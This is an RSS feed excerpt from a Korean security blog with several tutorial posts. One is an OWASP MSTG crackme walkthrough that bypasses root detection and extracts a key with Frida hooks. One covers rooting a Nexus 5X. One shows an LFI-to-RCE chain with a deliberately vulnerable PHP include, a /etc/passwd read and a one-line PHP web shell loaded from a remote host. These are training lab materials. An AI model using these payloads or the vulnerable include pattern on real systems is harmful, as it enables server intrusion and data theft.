      <pubDate>Fri, 12 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;OWASP-MSTG란&quot;&gt;&lt;a href=&quot;#OWASP-MSTG란&quot; class=&quot;headerlink&quot; title=&quot;OWASP-MSTG란?&quot;&gt;&lt;/a&gt;OWASP-MSTG란?&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/OWAS</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="OWASP-MSTG란"><a href="#OWASP-MSTG란" class="headerlink" title="OWASP-MSTG란?"></a>OWASP-MSTG란?</h3><p><a href="https://github.com/OWASP/owasp-mstg">https://github.com/OWASP/owasp-mstg</a></p><p>모바일 어플리케이션 보안 진단을 위한 정보들과 모의 해킹을 할 수 있는 <code> Crackme </code> 같은 어플리케이션을 제공한다.</p><p>앱 다운로드는 아래 링크에서 가능하다.</p><p><a href="https://github.com/OWASP/owasp-mstg/tree/master/Crackmes">https://github.com/OWASP/owasp-mstg/tree/master/Crackmes</a></p><hr><h3 id="분석-도구"><a href="#분석-도구" class="headerlink" title="분석 도구"></a>분석 도구</h3><ul><li><p>IDA(<a href="https://www.hex-rays.com/products/ida/">https://www.hex-rays.com/products/ida/</a>)</p></li><li><p>FRIDA(<a href="https://frida.re/">https://frida.re/</a>)</p></li><li><p>APKTOOLS(<a href="https://ibotpeaches.github.io/Apktool/">https://ibotpeaches.github.io/Apktool/</a>)</p></li><li><p>JADX(<a href="https://github.com/skylot/jadx">https://github.com/skylot/jadx</a>)</p></li><li><p>JEB(<a href="https://www.pnfsoftware.com/">https://www.pnfsoftware.com/</a>)</p></li></ul><ul><li>adb command</li></ul><hr><h3 id="디바이스-amp-PC-연결"><a href="#디바이스-amp-PC-연결" class="headerlink" title="디바이스 &amp; PC 연결"></a>디바이스 &amp; PC 연결</h3><ul><li>해당 과정부터는 루팅 및 USB 디버깅 모드가 활성화 상태로만 가능합니다.</li></ul><p>루팅 과정을 하지 않으셨다면 이전 게시글을 보고 루팅을 해주세요! (글에서는 공기계 루팅을 대상으로 진행)</p><p>또, 공기계가 따로 없으신분들은 <code> Nox 가상 앱 플레이어 </code> 를 사용하셔도 무방합니다.</p><pre><code class="bash">adb devices # 연결된 디바이스 확인adb shell # 디바이스 쉘 접속su # root 권한 요청</code></pre><hr><h3 id="Frida-Server-Install"><a href="#Frida-Server-Install" class="headerlink" title="Frida Server Install"></a>Frida Server Install</h3><p>루팅이 완료되었다면, 이제 분석 디바이스에 Frdia Server 서비스를 설치하고 구동시켜야 한다. (Frida 분석 목적)</p><ul><li><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></li></ul><img src="/img/post/android_penetration/1.png" class="lazyload" data-srcset="/img/post/android_penetration/1.png" srcset="data:image/png;base64,666"><p>사진과 같이 Release 버전들이 업로드되어 있는데 본인의 디바이스 환경에 맞는 펌웨어를 선택해서 다운로드 받자.</p><p>본인의 디바이스 환경은 <code> adb shell </code> 환경에서 <code> cat /proc/cpuinfo </code> 명령어를 통해 확인할 수 있다.</p><p>다운로드가 완료되었으면, 아래 명령어를 통해 디바이스 로컬 저장소에 파일을 넣어준 뒤 실행하자.</p><pre><code class="bash">adb push &lt;filename&gt; /date/local/tmp./&lt;binary filename&gt; &amp;</code></pre><p>Frida Server를 실행시킨 뒤 <code> adb shell </code> 모드를 빠져나와서 아래 명령어를 입력해보자.</p><pre><code class="bash">frida-ps -U</code></pre><p>위 과정이 잘 진행이 되었다면 아래와 같은 목록이 표시될 것이다.</p><img src="/img/post/android_penetration/2.png" class="lazyload" data-srcset="/img/post/android_penetration/2.png" srcset="data:image/png;base64,666"><hr><h3 id="App-Analysis-1-Decompile-to-APK"><a href="#App-Analysis-1-Decompile-to-APK" class="headerlink" title="App Analysis(1) - Decompile to APK"></a>App Analysis(1) - Decompile to APK</h3><p>이제 본격적인 앱 분석을 위해 어플리케이션 디컴파일 과정을 거쳐 smail 코드를 볼 것이다.</p><p>디컴파일 도구로는 본문에 표시된 <code> apktool, jadx, jeb </code> 도구를 활용할 수 있다.</p><p>우선 apktools로 APK를 디컴파일 하는 과정은 아래 명령어로 수행할 수 있다.</p><pre><code class="bash">apktool d &lt;application&gt;</code></pre><img src="/img/post/android_penetration/3.png" class="lazyload" data-srcset="/img/post/android_penetration/3.png" srcset="data:image/png;base64,666"><img src="/img/post/android_penetration/4.png" class="lazyload" data-srcset="/img/post/android_penetration/4.png" srcset="data:image/png;base64,666"><p>어플리케이션 디컴파일이 완료되었다면 아래 사진과 같이 어플리케이션을 빌드한 파일들과 smail 코드가 나온다. </p><hr><h3 id="App-Analysis-2-Analyze-to-APK"><a href="#App-Analysis-2-Analyze-to-APK" class="headerlink" title="App Analysis(2) - Analyze to APK"></a>App Analysis(2) - Analyze to APK</h3><p>이제, 어플리케이션 디컴파일 과정을 거쳤다면 앱 로직에 대해서 분석해보는 단계이다.</p><img src="/img/post/android_penetration/5.png" class="lazyload" data-srcset="/img/post/android_penetration/5.png" srcset="data:image/png;base64,666"><p><code> JADX </code> 도구를 활용하면 위 사진과 같이 java 코드를 확인할 수 있으니 참고하도록 하자.</p><p>우선 다운로드 받은 APK를 루팅 기기에서 일반적으로 실행하면, 루팅 탐지 로직때문에 강제 종료가 된다.</p><p>그 로직을 분석한다음 우회를 해볼건데 하나씩 해보자</p><img src="/img/post/android_penetration/6.png" class="lazyload" data-srcset="/img/post/android_penetration/6.png" srcset="data:image/png;base64,666"><p>앱이 실행될 때 동작하는 onCreate() 함수 부분을 보면 <code> c.a(), c.b(), c.c() </code> 로직과 같이</p><p>루팅된 디바이스일 경우 탐지하는 로직과 디버깅 모드를 탐지하는 로직이 있다.</p><img src="/img/post/android_penetration/7.png" class="lazyload" data-srcset="/img/post/android_penetration/7.png" srcset="data:image/png;base64,666"><img src="/img/post/android_penetration/8.png" class="lazyload" data-srcset="/img/post/android_penetration/8.png" srcset="data:image/png;base64,666"><p>위 두 사진은 디바이스의 루팅 상태를 체크하는 로직, 디버깅 모드 여부를 체크하는 로직이다.</p><p>루팅의 경우 다들 아실만한 <code> SuperSu </code> 관련 파일들이 눈에 띄게 보인다.</p><p>뭐.. 아무튼 시스템 경로나 루팅과 연관된 파일을 검사하는 정도이고</p><p>두 번째 사진에서는 <code> context.getApplicationContext().getApplicationInfo().flags </code> 이 부분이 디버깅 모드 상태를 확인하는 것이다.</p><p>위 두가지 로직에 하나라도 해당되는 상태라면, 앱이 정상적으로 실행되지 않고. exit() 함수가 실행되어 앱이 종료될 것이다.</p><hr><h3 id="App-Analysis-3-Root-Detected-Bypass"><a href="#App-Analysis-3-Root-Detected-Bypass" class="headerlink" title="App Analysis(3) - Root Detected Bypass"></a>App Analysis(3) - Root Detected Bypass</h3><p>그럼 루팅이 감지되었을 때 우회하는 방법은 어떻게 될까.</p><p>위에서 분석해봤듯이, 루팅이나 디버깅 체크 로직에 탐지될 경우 exit() 함수가 실행되는데 이 함수를 후킹해서</p><p>자신이 원하는 흐름으로 흘러가게 할 수 있다. (exit() 함수가 동작하지 않도록 한다거나..)</p><img src="/img/post/android_penetration/9.png" class="lazyload" data-srcset="/img/post/android_penetration/9.png" srcset="data:image/png;base64,666"><p>위 경우 Frida로 특정 함수를 후킹해서 진행할 수 있는데 예제 코드는 사진과 같다.</p><img src="/img/post/android_penetration/10.png" class="lazyload" data-srcset="/img/post/android_penetration/10.png" srcset="data:image/png;base64,666"><img src="/img/post/android_penetration/11.png" class="lazyload" data-srcset="/img/post/android_penetration/11.png" srcset="data:image/png;base64,666"><p>코드를 뚝딱하고나서 앱 실행 -&gt; 코드 실행을 해보면 사진과 같이 exit() 함수가 후킹되었다고 출력되고,</p><p>실제 앱에서 봤을 때도 exit() 함수가 실행되지 않아 앱이 작동하는 화면이다.</p><hr><h3 id="App-Analysis-4-Get-Secret-Key"><a href="#App-Analysis-4-Get-Secret-Key" class="headerlink" title="App Analysis(4) - Get Secret Key"></a>App Analysis(4) - Get Secret Key</h3><img src="/img/post/android_penetration/12.png" class="lazyload" data-srcset="/img/post/android_penetration/12.png" srcset="data:image/png;base64,666"><p>루팅 탐지 우회만이 끝이 아니다. 앱을 보면 특정 키값을 입력하여 확인하는 로직이 있다.</p><p>a.a() 조건을 만족할 경우 Success 제목과 correct 메세지를 띄워주고, 그게 아니라면 Nope..(try again) 문구를 띄운다.</p><img src="/img/post/android_penetration/13.png" class="lazyload" data-srcset="/img/post/android_penetration/13.png" srcset="data:image/png;base64,666"><p>키를 만들것 같은 부분은 a.a() 에 존재하는데 해당 로직을 따라가면 사진과 같이 확인할 수 있다.</p><p>8d127684cbc37c17616d806cf50473cc 이 값을 b()에 넣고</p><p>5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc= 값을 Base64-Decode 한 값을 <code> sg.vantagepoint.a.a.a </code></p><p>함수를 호출하여 bArr 라는 변수에 저장하게 됩니다.</p><p>이후 bArr에 저장된 값과 입력한 값을 비교하여 return (true/false)를 반환 해주고 있다.</p><p>따라서, 키 값을 만들어주는 함수를 후킹해서 값을 확인할 것이다.</p><pre><code class="java">Java.perform(function() &#123;    var secret_class = Java.use(&quot;sg.vantagepoint.a.a&quot;);        secret_class.a.implementation = function(arr1, arr2)&#123;        var retval = this.a(arr1, arr2);        var secret_msg = &quot;&quot;;        for(var i=0; i &lt; retval.length; i++)&#123;            secret_msg += String.fromCharCode(retval[i]);        &#125;        console.log(&quot;[*] Secret Method Hooking!!&quot;);        console.log(secret_msg);        return retval;        &#125;&#125;);</code></pre><p>후킹하는 코드는 간단하다. exit() 함수를 후킹할 때와 비슷한 방향으로 진행하면 되는데</p><p><code> sg.vantagepoint.a.a.a </code> 는 인자가 2개이기 때문에 그에 맞게 인자를 처리해주고,</p><p>for문을 활용해서 fromCharCode(문자열 변환) 함수로 변수하나를 지정해서 키 값을 저장해주면 된다.</p><img src="/img/post/android_penetration/14.png" class="lazyload" data-srcset="/img/post/android_penetration/14.png" srcset="data:image/png;base64,666"><p>결과로 Secret key 값을 정상적으로 얻어낼 수 있다.</p><h3 id="기타"><a href="#기타" class="headerlink" title="기타"></a>기타</h3><p>본문에 사용된 코드는 아래 깃허브에서 확인할 수 있습니다.</p><p>다음편에서 계속…</p><ul><li><a href="https://github.com/jhye0n/android_frida_python">https://github.com/jhye0n/android_frida_python</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Application/">Application</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/OWASP-MSTG/">OWASP-MSTG</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/13/owasp-mstg-210131/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>(스터디 자료) 안드로이드 앱 분석 기초 part.1</title>
      <link>https://blog.jhyeon.dev/2021/01/31/android-app-penetration-study-210131/</link>
      <guid>https://blog.jhyeon.dev/2021/01/31/android-app-penetration-study-210131/</guid>
      <pubDate>Sun, 31 Jan 2021 06:09:52 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Link&quot;&gt;&lt;a href=&quot;#Link&quot; class=&quot;headerlink&quot; title=&quot;Link&quot;&gt;&lt;/a&gt;Link&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://drive.google.com/file/d/1CVK_wyioojm3qDyqXUAx</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p><a href="https://drive.google.com/file/d/1CVK_wyioojm3qDyqXUAxTVYLEak8ih4F/view?usp=sharing">https://drive.google.com/file/d/1CVK_wyioojm3qDyqXUAxTVYLEak8ih4F/view?usp=sharing</a></p><p>해당 자료를 활용한 무단 배포 등의 행위는 금지합니다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Application/">Application</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Study/">Study</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/31/android-app-penetration-study-210131/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>넥서스 5X 벽돌폰 복구 + 루팅</title>
      <link>https://blog.jhyeon.dev/2021/01/31/android-rootkit-210131/</link>
      <guid>https://blog.jhyeon.dev/2021/01/31/android-rootkit-210131/</guid>
      <pubDate>Sat, 30 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;벽돌폰-계기&quot;&gt;&lt;a href=&quot;#벽돌폰-계기&quot; class=&quot;headerlink&quot; title=&quot;벽돌폰 계기&quot;&gt;&lt;/a&gt;벽돌폰 계기&lt;/h3&gt;&lt;p&gt;최근에 BoB 프로젝트 때 썼던 도구들도 있고 이를 바탕으로 앱 모의해킹 한번 시도해보고자&lt;/p&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="벽돌폰-계기"><a href="#벽돌폰-계기" class="headerlink" title="벽돌폰 계기"></a>벽돌폰 계기</h3><p>최근에 BoB 프로젝트 때 썼던 도구들도 있고 이를 바탕으로 앱 모의해킹 한번 시도해보고자</p><p>잠들어있던 Nexus 5X 공기계를 살려냈다.</p><p>근데 이폰이 루팅만 해놓고 몇번 테스트용도로만 쓰다가 안써왔더니 터치도 안되고 해서 그냥 포맷하고</p><p>다시 루팅을 걸어서 앱 분석을 하려고 했으나.. 루팅 하는 과정에서 실수(?)로 인하여 벽돌폰을 만들어버렸다. (ㅎㅎ)</p><img src="/img/post/android_root/1.jpeg" class="lazyload" data-srcset="/img/post/android_root/1.jpeg" srcset="data:image/png;base64,666"><p>그래서 <code> Nexus Root Toolkit 2.19 </code> 프로그램을 써서 복구를 했는데 과정은 크게 어렵진 않아서 생략한다.</p><p>다만 이 프로그램이 패치가 2년전?부터 중단했기 때문에 펌웨어는 다소 구버전 일 수 있으나 살려내는게 큰 목적이라면 이것도 상관없다.</p><h3 id="루팅-재-시도"><a href="#루팅-재-시도" class="headerlink" title="루팅 재 시도"></a>루팅 재 시도</h3><p>이번에 루팅을 할 때는 그냥 수동으로 oem unlock 걸고 해서 한 방법인데 아래와 같이 수행했다.</p><ul><li>OEM 잠금 해제 -&gt; USB 디버깅 활성화</li></ul><img src="/img/post/android_root/2.jpeg" class="lazyload" data-srcset="/img/post/android_root/2.jpeg" srcset="data:image/png;base64,666"><img src="/img/post/android_root/3.jpeg" class="lazyload" data-srcset="/img/post/android_root/3.jpeg" srcset="data:image/png;base64,666"><hr><ul><li>안드로이드 스튜디오 &amp; platform tools 설치</li></ul><p><a href="https://developer.android.com/studio/install?hl=ko">https://developer.android.com/studio/install?hl=ko</a></p><hr><ul><li>디바이스랑 PC를 USB로 연결해서 adb 사용</li></ul><pre><code class="bash">adb devices # 현재 현결된 디바이스 확인adb reboot bootloader # 부트로더 화면으로 재부팅fastboot oem unlock # oem unlockfastboot reboot # 재부팅</code></pre><hr><ul><li>TWRP Recovery 도구 설치</li></ul><p><a href="https://dl.twrp.me/bullhead/">https://dl.twrp.me/bullhead/</a></p><hr><ul><li>루팅(1)</li></ul><pre><code class="bash">adb reboot bootloaderfastboot flash recovery &lt;imgfile&gt;adb reboot bootloader</code></pre><ul><li>SuperSU 다운로드</li></ul><pre><code class="bash">adb push BETA-SuperSU-v2.66-20160103015024.zip /sdcard/</code></pre><p>이런 과정이 사실 좀 복잡한데, 위에 언급됐던 <code> Nexus Root Toolkit 2.19 </code></p><p>써서 원클릭으로 루팅도 가능하니 알아두자..</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Root/">Root</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Nexus5X/">Nexus5X</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/31/android-rootkit-210131/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>LFI를 활용한 RCE 연계하기</title>
      <link>https://blog.jhyeon.dev/2021/01/23/lfi-to-rce-210123/</link>
      <guid>https://blog.jhyeon.dev/2021/01/23/lfi-to-rce-210123/</guid>
      <pubDate>Fri, 22 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;DVWA 리뷰를 할 때 LFI 공격에 관해서 잠깐 다뤄보았을 때 LFI를 활용해 어떤 추가 공격이 나올 </description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>DVWA 리뷰를 할 때 LFI 공격에 관해서 잠깐 다뤄보았을 때 LFI를 활용해 어떤 추가 공격이 나올 수 있는지 작성하기로 했었다.</p><p>이번 글에서는 RCE(Remote Code Execution)을 연계하는 방법에 대해서 적어볼 것이다.</p><h3 id="LFI-amp-RFI-개념"><a href="#LFI-amp-RFI-개념" class="headerlink" title="LFI &amp; RFI 개념"></a>LFI &amp; RFI 개념</h3><p>LFI(Local File Inclusion) 취약점은 <code> 내부 서버 </code> 파일을 읽어올 수 있는 취약점입니다.<br>RFI(Remote File Inclusion) 취약점은 <code> 외부 서버 </code> 로 부터의 파일을 읽어올 수 있는 취약점입니다.</p><p>즉, 내부에서 불러오는 것과 외부에서 불러온다는 점에서 약간의 차이가 있지만 두 취약점의 역할은 동일합니다.</p><h3 id="테스트-1-LFI-환경-만들기"><a href="#테스트-1-LFI-환경-만들기" class="headerlink" title="테스트(1) LFI 환경 만들기"></a>테스트(1) LFI 환경 만들기</h3><p>우선 LFI를 테스트해볼 환경을 간단하게만 만들어보겠습니다.</p><p><code> test.php(테스트 페이지) </code></p><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;ko&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt; test page &lt;/title&gt;&lt;/head&gt;&lt;body&gt;get&lt;?php include($_GET[&#39;page&#39;]);?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>코드에는 LFI 취약점을 발생시키기 위한 include 함수만을 사용하였고, 나머지는 표준 html 작성 방식입니다.</p><p>이제 해당 코드에서 page 인자를 통한 내부 파일을 로드시켜보겠습니다.</p><p><code> ?page=/etc/passwd </code></p><img src="/img/post/lfi_to_rce/lfi.png" class="lazyload" data-srcset="/img/post/lfi_to_rce/lfi.png" srcset="data:image/png;base64,666"><p>서버 내부의 /etc/passwd 파일을 정상적으로 읽어오면서 화면에 출력이 가능하게 됩니다.</p><p>이런 공격을 바로 LFI 취약점이라고 할 수 있고 여기서 조금 더 연계해서 RCE까지 가봅시다.</p><h3 id="테스트-2-LFI-amp-RCE"><a href="#테스트-2-LFI-amp-RCE" class="headerlink" title="테스트(2) LFI &amp; RCE"></a>테스트(2) LFI &amp; RCE</h3><p>우선 Remote(외부) 환경의 파일을 로드하기 위해 설정 해야 할 옵션들이 있습니다.</p><blockquote><p>(php.ini)</p></blockquote><ol><li>allow_url_include = On</li></ol><p>웹을 실제로 운영할 때는 이런 옵션 하나하나 숙지하시고 관리를 잘 해주셔야 하고 평상시에는 On으로 두시면 안됩니다.</p><p>이후, 아래 웹 쉘을 실행시키는 페이로드를 간단하게 짜서 페이지에 로드시켜보겠습니다.</p><p><code> payload.php </code></p><pre><code class="php">&lt;?phpsystem($_GET[&#39;cmd&#39;]);?&gt;</code></pre><p>그러면, test.php(메인 테스트 페이지)에서 해당 파일을 어떻게 불러올 수 있을까요.</p><p><code> ?page=http://~~/payload.php?cmd=pwd </code></p><p>이런 공격 URL이 나오게 되겠죠.</p><p>payload.php를 불러와서 현재 페이지에 로드시켜보면 다음과 같이 웹 쉘을 작동시킬 수 있습니다.</p><img src="/img/post/lfi_to_rce/payresult.png" class="lazyload" data-srcset="/img/post/lfi_to_rce/payresult.png" srcset="data:image/png;base64,666">]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/RCE/">RCE</category>
      
      <category domain="https://blog.jhyeon.dev/tags/LFI/">LFI</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pentesting/">Pentesting</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/23/lfi-to-rce-210123/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
